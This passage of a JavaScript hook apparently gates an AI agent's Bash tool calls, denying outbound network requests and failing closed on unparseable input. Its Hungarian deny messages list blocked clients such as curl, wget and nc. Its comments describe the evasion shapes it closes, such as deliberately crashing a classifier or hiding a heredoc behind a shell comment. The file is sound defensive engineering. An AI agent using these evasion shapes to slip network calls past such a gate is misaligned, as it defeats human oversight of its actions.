  const raw = String(command ?? '')
  let norm = ''
  const at = []
  for (let i = 0; i < raw.length; i++) {
    const m = /^\\\r?\n/.exec(raw.slice(i, i + 3))
    if (m) { norm += ' '; at.push(i); i += m[0].length - 1; continue }
    norm += raw[i]; at.push(i)
  }
  at.push(raw.length)
  const { stripped: orig } = liftSubstitutions(norm)
  const masked = maskInertLiterals(orig)
  if (masked === null || masked.length !== orig.length) return null
  const docs = heredocBodies(orig, masked)
  const liveText = blankRanges(orig, [...docs.map((d) => [d.start, d.end]), ...caseRanges(masked)])
  const env = collectAssignments(orig, masked)
  const out = raw.split('')
  for (const [a, b] of spans(masked)) {
    const here = docs.find((d) => d.at >= a && d.at < b)
    if (!here) continue
    const av = shellWords(expand(liveText.slice(a, b), env))
    const un = unwrapLaunchers(av)
    let word = (av[un.at] ?? '').split('/').pop()
    let rest = av.slice(un.at + 1)
    const run = unwrapRunner(word, rest)
    if (run) { word = run.word; rest = run.rest }
    if (word === 'npx' || word === 'bunx') {
      let k = 0
      while (k < rest.length && rest[k].startsWith('-')) k++
      if (SCRIPT_INTERPRETER.test((rest[k] ?? '').split('/').pop())) { word = rest[k].split('/').pop(); rest = rest.slice(k + 1) }
    }
    const lang = langOf(word)
    if ((lang !== 'py' && lang !== 'js') || !scriptOf(rest, word)?.stdin) continue
    for (let k = at[here.start]; k < at[here.start + here.body.length]; k++) if (out[k] !== '\n' && out[k] !== '\r') out[k] = ' '
  }
  return out.join('')
}

const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl, wget/nc-szeru kliens, interpreter-egysoros, ' +
  'vagy egy interpreternek adott heredoc / futtatott szkript-fajl halozati hivasa kulso URL-re, akkor is, ha az ' +
  'URL valtozoban van, es akkor is, ha a parancs inditoba, parancs-szovegbe, source-olt fajlba vagy csobe van ' +
  'csomagolva. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
// a9c7bee0: an unparseable command (maskInertLiterals could not resolve it) is denied fail-closed; this message names
// the branch and the fix. No command text is shown or logged, only the branch label.
const UNPARSEABLE_MSG =
  'Ertelmezhetetlen Bash-parancs TILTVA (egress hard-gate, fail-closed): a kapu nem tudta lezarni az idezojelet vagy a ' +
  'heredocot, ezert nem tudja atvizsgalni, mi megy ki. Javitas: zard le a hianyzo idezojelet (\', ", $\'...\') vagy a ' +
  'heredocot (a nyito tag parja egy sajat sorban); hosszu szoveget idezett heredocbol (<<\'EOF\') elobb fajlba irj, majd ' +
  'a parancs a fajlt hasznalja. Ha a parancs helyes es megis elakad, jelezd a fo ugynoknek.'
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch { process.exit(0) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  if (MASK_LOAD_ERROR) {
    process.stderr.write(
      'EGRESS-KAPU: TILTVA. A kapu fuggosege (scripts/self-pace-gate.mjs) nem toltheto be ' +
      `(${MASK_LOAD_ERROR?.message ?? MASK_LOAD_ERROR}) -- fail-closed: a Bash-hivas halozati celja nem ` +
      'ellenorizheto, ezert minden Bash-hivas tiltva, amig a modul nem javul. A javitas a fo ugynoke ' +
      '(ez a kapu az o munkameneteben nem fut); addig a Bash-t ne probald ujra.\n')
    process.exit(2)
  }
  let r
  // 95800e1d (owner side, (b)): a classifier that throws DENIES, like a load failure (exit 2 with a
  // message). The upstream parser's documented fail-open on an internal error is not taken here: on the fleet's real Bash
  // traffic (543 563 commands) neither classifier threw once, so the deny costs nothing measured and closes the input
  // that would make a classifier throw on purpose.
  const internalErrorDenies = (which, e) => {
    process.stderr.write(
      `EGRESS-KAPU: TILTVA. A kapu ${which} osztalyozoja belso hibaval allt meg (${e?.message ?? e}) -- fail-closed: ` +
      'ez a Bash-hivas tiltva. Ha ismetlodik, jelezd a fo ugynoknek.\n')
    process.exit(2)
  }
  try { r = classify(payload?.tool_input?.command, 0, loadVendorHosts(), loadVendorDomains(), { cwd: payload?.cwd || process.cwd() }) } catch (e) { internalErrorDenies('helyi', e) }
  // 95800e1d: the upstream parser's second opinion (upstreamVerdictApplies). Loaded like self-pace-gate.mjs above: a
  // DYNAMIC import, and a load failure denies (exit 2), because an exit 1 would be non-blocking.
  if (!r.deny) {
    let up = null
    try {
      up = await import('./bash-egress-parser-upstream.mjs')
      if (typeof up.classify !== 'function') throw new Error('missing export: classify')
    } catch (err) {
      process.stderr.write(
        'EGRESS-KAPU: TILTVA. A kapu masodik osztalyozoja (scripts/hooks/bash-egress-parser-upstream.mjs) nem toltheto be ' +
        `(${err?.message ?? err}) -- fail-closed: minden Bash-hivas tiltva, amig a fajl nem javul. A javitas a fo ugynoke.\n`)
      process.exit(2)
    }
    // a9c7bee0 fix2: feed the upstream the command with SHELL COMMENTS blanked, the same as the local layer sees. The
    // upstream file's code stays byte-identical (the pin and the EXEMPT test hold); only the INPUT is comment-blanked here, so a
    // `# ... <<` comment no longer makes the upstream read an unterminated heredoc and give up (unparseable). That keeps a
    // real external call after such a comment (the K6 shape) denied via the upstream, instead of slipping through.
    const upCmd = blankShellComments(String(payload?.tool_input?.command ?? '').replace(/\\\r?\n/g, ' '))
    let h = null
    try { h = up.classify(upCmd, 0, up.loadVendorHosts(), up.loadVendorDomains()) } catch (e) { internalErrorDenies('upstream', e) }
    const again = (c) => up.classify(c, 0, up.loadVendorHosts(), up.loadVendorDomains())
    if (upstreamVerdictApplies(upCmd, h, again)) r = { deny: true, reason: `upstream-${h.reason}`, hosts: h.hosts }
  }
  if (r.deny) {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts }) + '\n')
    } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
    const decisionReason = typeof r.reason === 'string' && r.reason.startsWith('unparseable')
      ? `${UNPARSEABLE_MSG} (ag: ${r.reason})`
      : `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})`
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: decisionReason } }))
  }
  process.exit(0)
}
